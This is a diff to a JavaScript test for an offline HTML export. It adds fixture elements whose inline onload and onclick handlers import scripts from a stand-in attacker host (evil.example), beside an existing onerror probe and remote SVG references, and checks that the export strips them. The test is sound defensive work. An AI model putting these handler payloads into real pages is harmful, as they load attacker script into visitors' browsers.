@@ -423,6 +423,8 @@ test("Export Offline adds a zero-network CSP and strips loader, media, CSS, and 
 <p id="egress-note">Offline export must strip every load vector.</p>
 <img id="sameOriginBeacon" alt="same origin beacon" src="__SAME_ORIGIN__/same-origin.png">
 <img id="handlerProbe" alt="handler probe" src="data:image/gif;base64,AA" onerror="import('https://evil.example/onerror.js')">
+<svg width="20" height="20" aria-label="foreign handler probe"><rect id="foreignHandlerProbe" width="20" height="20" onload="import('https://evil.example/foreign-handler.js')"/></svg>
+<noscript><button id="noscriptHandlerProbe" onclick="import('https://evil.example/noscript-handler.js')">go</button></noscript>
 <svg width="20" height="20" aria-label="remote svg refs">
   <image href="https://evil.example/vector.png" width="20" height="20"></image>
   <use href="https://evil.example/sprite.svg#icon"></use>
@@ -468,6 +470,16 @@ test("Export Offline adds a zero-network CSP and strips loader, media, CSS, and 
     const handlerTag = exportedHtml.match(/<img\b[^>]*id="handlerProbe"[^>]*>/i);
     expect(handlerTag && handlerTag[0]).toBeTruthy();
     expect(handlerTag[0]).not.toMatch(/\sonerror\s*=/i);
+    // The two shapes only a DOM WALK reaches: a self-closed FOREIGN element, and an element inside
+    // a <noscript> body (markup to the DOMParser the export re-parses with, since scripting is off
+    // there). The strict validator reads both off its egress tag index, so the export and the gate
+    // it is measured by have to agree about them (CMH-OFFLINE-05).
+    const foreignHandlerTag = exportedHtml.match(/<rect\b[^>]*id="foreignHandlerProbe"[^>]*>/i);
+    expect(foreignHandlerTag && foreignHandlerTag[0]).toBeTruthy();
+    expect(foreignHandlerTag[0]).not.toMatch(/\sonload\s*=/i);
+    const noscriptHandlerTag = exportedHtml.match(/<button\b[^>]*id="noscriptHandlerProbe"[^>]*>/i);
+    expect(noscriptHandlerTag && noscriptHandlerTag[0]).toBeTruthy();
+    expect(noscriptHandlerTag[0]).not.toMatch(/\sonclick\s*=/i);
     expect(exportedHtml).not.toContain("evil.example");
     expect(exportedHtml).not.toContain(server.url + "/same-origin.png");
     expect(exportedHtml).not.toMatch(/<link\b[^>]*rel=["'][^"']*(?:prefetch|prerender)/i);
